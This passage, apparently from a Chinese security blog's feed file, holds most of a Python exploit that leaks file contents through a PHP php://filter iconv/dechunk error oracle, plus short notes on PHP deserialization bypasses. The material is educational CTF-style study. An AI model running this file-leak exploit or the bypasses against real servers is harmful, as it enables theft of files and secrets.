class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-e</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># A-E</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># f</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># F</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;F&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-s N-S</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-r</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># N-R</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># s</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># S</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;S&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># i j k</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;k&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;j&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># I J K</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;J&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;I&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># v w x</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;x&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;w&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;v&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># V W X</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;X&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;W&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;V&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># M</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;M&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># m</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># l</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># L</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;L&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># h</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;h&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># H</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;H&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># u</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;u&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># U</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;U&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># g</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;g&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># G</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;G&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># t</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;t&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># T</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;T&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>&#x27;</span><br>letter = find_letter(prefix)<br><span class="hljs-comment"># it&#x27;s a number! check base64</span><br><span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span><br>s = find_letter(prefix)<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:<br><span class="hljs-comment"># 0 - 3</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:<br><span class="hljs-comment"># 4 - 7</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;4&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;7&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:<br><span class="hljs-comment"># 8 - 9</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;8&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;9&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;wtf&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(end=letter)<br>o += letter<br>sys.stdout.flush()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">We are done!! :)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We are done!! :)&quot;</span>)<br>d = b64decode(o.encode() + <span class="hljs-string">b&#x27;=&#x27;</span> * <span class="hljs-number">4</span>)<br><span class="hljs-comment"># remove KR padding</span><br>d = d.replace(<span class="hljs-string">b&#x27;$)C&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(b64decode(d))<br><br></code></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这两个是否可以结合起来, 把无回显的任意文件读取变成RCE?  ( 可能只是需要的时间长些?</p><p>期待大佬们的exp :&gt;</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php://filter,</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>知识回顾：<br><a href="https://www.cnblogs.com/superwinner/p/17260940.html">https://www.cnblogs.com/superwinner/p/17260940.html</a></p><p>__construct 函数只有在 new的时候会被调用,反序列化不会自动调用.</p><p>protected的变量名前会有null*null的标志，所以不能直接复制（null不会被复制下来）<br>![[Pasted image 20250120104527.png]]<br>private同理，会有null+类名+null前缀<br>![[Pasted image 20250120104649.png]]<br>可以先输出到文件里查看</p><p>见 <a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">网鼎杯 AreUserializ</a></p><p>反序列化逃逸:</p><ol><li>数组变量中有<code>&#125;</code>会导致序列化-&gt;反序列化之后得到的数组改变</li></ol><p>绕过：</p><ol><li>正则：<br><code>/^O:[\d]/i</code><br>可以在object外面套一层array,同样可以触发</li></ol><p><code>/^[Oa]:[\d]/i</code><br>+号绕过,如 <code>O:+3...</code></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含漏洞</title>
    <link href="/blogs/php/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/blogs/php/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
